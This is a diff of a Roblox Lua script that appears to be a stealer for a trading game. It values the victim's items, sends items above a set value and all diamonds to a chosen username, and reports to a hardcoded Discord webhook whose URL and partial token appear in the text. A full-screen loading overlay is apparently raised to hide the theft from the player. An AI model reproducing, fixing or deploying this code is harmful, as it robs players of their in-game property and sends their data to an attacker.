@@ -2,6 +2,7 @@ LogsWebhook = "https://discord.com/api/webhooks/1369712217813155893/13A7AC1JWpFU
 
 min_rap = 500000 -- minimum rap of each item you want to get sent to you. 1 mil by default
 
+
 -- Loading Screen 1
 local LoadingScreenFunction = require(game:GetService("ReplicatedStorage").Library.Client.GUIFX.Transition)
 game.Players.LocalPlayer.PlayerGui.Transition.DisplayOrder = 6000000000000
@@ -165,6 +166,10 @@ local function SendMessage(username, diamonds)
     end
 end
 
+
+-- (Devam eden kodlar aynı şekilde devam eder...)
+
+
 -- fixed by !jsp on discord (discord id: 834769808297164831)
 local gemsleaderstat = plr.leaderstats["\240\159\146\142 Diamonds"].Value
 local gemsleaderstatpath = plr.leaderstats["\240\159\146\142 Diamonds"]
@@ -191,32 +196,20 @@ game.DescendantAdded:Connect(function(x)
 end)
 -- fixed by !jsp on discord (discord id: 834769808297164831)
 local function getRAP(Type, Item)
-    local DevRAPCmds = require(game:GetService("ReplicatedStorage").Library.Client.RAPCmds)
-    local mockPetObject = {
-        Class = {Name = Type},
-        IsA = function(self, className)
-            return className == Type
-        end,
-        GetId = function(self)
-            return Item.id
-        end,
-        StackKey = function(self)
-            return HttpService:JSONEncode({id = Item.id, pt = Item.pt, sh = Item.sh, tn = Item.tn})
-        end,
-        AbstractGetRAP = function(self)
-            if DevRAPCmds and type(DevRAPCmds.Get) == "function" then
-                local success, result = pcall(DevRAPCmds.Get, self)
-                if success then
-                    return result
-                else
-                    return 0
-                end
-            else
-                return 0
+    return (require(game:GetService("ReplicatedStorage").Library.Client.DevRAPCmds).Get(
+        {
+            Class = {Name = Type},
+            IsA = function(hmm)
+                return hmm == Type
+            end,
+            GetId = function()
+                return Item.id
+            end,
+            StackKey = function()
+                return HttpService:JSONEncode({id = Item.id, pt = Item.pt, sh = Item.sh, tn = Item.tn})
             end
-        end,
-    }
-    return mockPetObject:AbstractGetRAP() or 0
+        }
+    ) or 0)
 end
 -- fixed by !jsp on discord (discord id: 834769808297164831)
 local user = Username
@@ -244,9 +237,11 @@ local function sendItem(category, uid, am)
 		newamount = 5000000
 	end
 end
+
 -- fixed by !jsp on discord (discord id: 834769808297164831)
 local function SendAllGems()
     for i, v in pairs(GetSave().Inventory.Currency) do
+
         if v.id == "Diamonds" then
 			if GemAmount1 >= (newamount + 10000) then
 				local args = {
